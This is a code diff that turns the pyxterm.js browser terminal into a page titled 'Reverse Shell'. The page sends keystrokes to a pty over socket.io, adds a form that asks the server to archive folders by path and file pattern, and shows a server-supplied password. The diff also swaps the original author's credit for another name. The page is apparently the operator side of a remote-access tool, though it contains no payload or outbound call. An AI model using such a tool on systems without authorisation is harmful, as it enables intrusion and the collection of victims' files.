@@ -1,23 +1,30 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>pyxterm.js</title>
+  <title>Reverse Shell</title>
   <style>
   html {
     font-family: arial;
+  }
+  div.nav{
+    padding: 8px
   }
   </style>
   <link rel="stylesheet" href="https://unpkg.com/xterm@3.6.0/dist/xterm.css" />
 </head>
 <body>
-
-<span style="font-size: 1.4em;">pyxterm.js</span>&nbsp;&nbsp;&nbsp;
-<span style="font-size: small;">status: <span style="font-size: small;" id="status">connecting...</span></span>
-
+<div class="nav">
+  <span style="font-size: 1.4em;">Reverse Shell</span>&nbsp;&nbsp;&nbsp;
+  <span style="font-size: small;">status: <span style="font-size: small;" id="status">connecting...</span></span>
+    <input type="text" placeholder="path,exclude_folders,file_pattern" required id="path_box">
+    <button onclick="myFunction()">Submit</button>
+    <span style="font-size: small;">err: <span style="font-size: small;" id="err">..</span></span>
+    <span style="font-size: small;">password: </span> <span style="font-size: small;" id="password">..</span>
+</div>
 <div style="width: 100%; height: calc(100% - 50px);" id="terminal"></div>
 
 <p style="text-align: right; font-size: small;">
-  built by <a href="https://grassfedcode.com">Chad Smith</a> <a href="https://github.com/cs01">GitHub</a>
+  built by <a href="#">Dumidu Pramith</a> <a href="#">GitHub</a>
 </p>
 <!-- xterm -->
 <script src="https://unpkg.com/xterm@3.6.0/dist/xterm.js"></script>
@@ -28,6 +35,44 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js"></script>
 
 <script>
+  function myFunction(){
+    console.log("clicked")
+    var path = document.getElementById("path_box");
+    var values = path.value
+
+    if (values){
+      var dir = values.match(/(^.*?),/g)
+      var args = values.match(/(\[.*?])/g)
+      console.log(args)
+      if (!dir){
+        var dir = values
+      }
+      try {
+      if (args[0]) {
+        var ex_folder = args[0]
+      }}
+      catch {
+        var ex_folder = ""
+      }
+      try{
+      if (args[1]){
+        var pattern = args[1]
+      } else {var pattern=""}
+      }
+      catch {
+        var pattern = ""
+      }
+    console.log({
+      "dir" : dir,
+      "ex_folder" : ex_folder,
+      "pattern" : pattern
+    })
+    socket.emit("archive_folder",{
+      "dir" : dir,
+      "ex_folder" : ex_folder,
+      "pattern" : pattern
+    })
+  }}
   Terminal.applyAddon(fullscreen)
   Terminal.applyAddon(fit)
   Terminal.applyAddon(webLinks)
@@ -41,28 +86,38 @@
   term.fit()
   term.resize(15, 50)
   console.log(`size: ${term.cols} columns, ${term.rows} rows`)
-  // term.toggleFullScreen(true)
+  term.toggleFullScreen(true)
   term.fit()
-  term.write("Welcome to pyxterm.js!\nhttps://github.com/cs01/pyxterm.js\n")
+  term.write("Welcome to reverseShell.js!")
   term.on('key', (key, ev) => {
     console.log("pressed key", key)
     console.log("event", ev)
     socket.emit("pty_input", {"input": key})
   });
 
-  const socket = io.connect('127.0.0.1:8000',{query : 50});
+  const socket = io.connect('127.0.0.1:8000');
   const status = document.getElementById("status")
+  const erro = document.getElementById("err")
+  const password = document.getElementById("password")
+  socket.on('error', function(err) {
+    erro.innerHTML = err
+  });
 
   socket.on("pty_output", function(data){
     console.log("new output", data)
     term.write(data.output)
   })
 
+  socket.on("password",function(data){
+    password.innerHTML = data
+  })
+
   socket.on("connect", () => {
     fitToscreen()
-    socket.emit("user_id", {"id": 48})
+    debounce(fitToscreen, wait_ms)
+    socket.emit("user_id", {"id": 6})
     status.innerHTML = '<span style="background-color: lightgreen;">connected</span>'
-    }
+  }
   )
 
   socket.on("disconnect", () => {
@@ -85,8 +140,6 @@
 
   const wait_ms = 50;
   window.onresize = debounce(fitToscreen, wait_ms)
-
-
 </script>
 
 </body>
